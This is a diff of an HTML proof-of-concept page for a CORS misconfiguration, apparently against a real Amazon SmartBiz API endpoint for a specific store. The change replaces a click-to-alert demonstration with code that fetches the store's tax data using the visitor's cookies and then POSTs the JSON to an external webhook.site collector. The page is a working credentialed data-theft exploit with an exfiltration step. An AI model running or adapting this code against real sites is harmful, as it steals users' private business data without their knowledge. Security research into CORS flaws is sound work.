@@ -3,27 +3,30 @@
     <title>CORS PoC</title>
   </head>
   <body>
-    <p>Click anywhere on this page to trigger the Cross-origin request.</p>
-    <div id="response"></div>
+    <button id="poc">req</button>
     <script>
-        document.addEventListener("DOMContentLoaded", () => {
-            document.onclick = () => {
-                open('https://smartbiz.amazon.in/settings/gst-seller');
-
-                fetch('https://smartbiz.amazon.in/api/stores/66307/tax', {
-                        method: 'GET',
-                        credentials: 'include',
-                        mode: 'cors'
-                    })
-                    .then(response => response.json())
-                    .then(data => {
-                        alert(JSON.stringify(data));
-                    })
-                    .catch(error => {
-                        console.log('Failed to issue Cross-origin request');
-                    });
-            }
-        });
+      document.getElementById('poc').addEventListener('click', function() {
+        const url = "https://smartbiz.amazon.in/api/stores/66307/tax";
+        fetch(url, { credentials: "include" }) 
+          .then(r => r.json())
+          .then(data => {
+            alert("Received data:\n" + JSON.stringify(data, null, 2));
+            console.log("Got JSON:", data);
+            return fetch("https://webhook.site/046b05de-2f7d-43ae-9875-6971f7658023", {
+              method: "POST",
+              headers: { "Content-Type": "text/plain" },
+              body: JSON.stringify(data)
+            });
+          })
+          .then(response => {
+            console.log("Forwarded to webhook:", response.status);
+            alert("Sent");
+          })
+          .catch(err => {
+            console.error("Error:", err);
+            alert("Error: " + err);
+          });
+      });
     </script>
-</body>
+  </body>
 </html>
